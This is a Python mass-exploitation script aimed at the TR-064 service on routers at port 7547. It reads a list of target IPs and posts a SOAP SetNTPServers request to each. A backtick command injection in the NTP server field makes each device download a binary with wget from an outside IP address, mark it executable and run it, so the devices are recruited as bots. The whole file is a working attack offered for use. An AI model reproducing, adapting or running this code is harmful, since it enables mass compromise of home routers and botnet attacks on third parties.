import requests
import sys

if (len(sys.argv) < 2):
	print("usage: python {0} list.txt. list.txt should 1 ip per line.".format(sys.argv[0]))
	sys.exit(1)

memes = open(sys.argv[1])
lines = memes.readlines()
cgi = "/UD/act?1"

request = """<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
	<u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">
	<NewNTPServer1>
		`cd /tmp;wget http://185.165.31.3/1;chmod 777 1; ./1`
	</NewNTPServer1>
	<NewNTPServer2></NewNTPServer2>
	<NewNTPServer3></NewNTPServer3>
	<NewNTPServer4></NewNTPServer4>
	<NewNTPServer5></NewNTPServer5>
</u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>"""

headers = {"Host": "http://127.0.0.1:7547",
			"Content-Type":"text/xml",
			"Content-Length":str(len(request)),
			"SOAPAction":"urn:dslforum-org:service:Time:1#SetNTPServers"}

for line in lines:
	try:
		line = "http://"+line+cgi
		line = line.rstrip("\n")
		response = requests.post(url=line, headers=headers, data=request, allow_redirects=False)
		print("Success")
	except Exception as e:
		pass
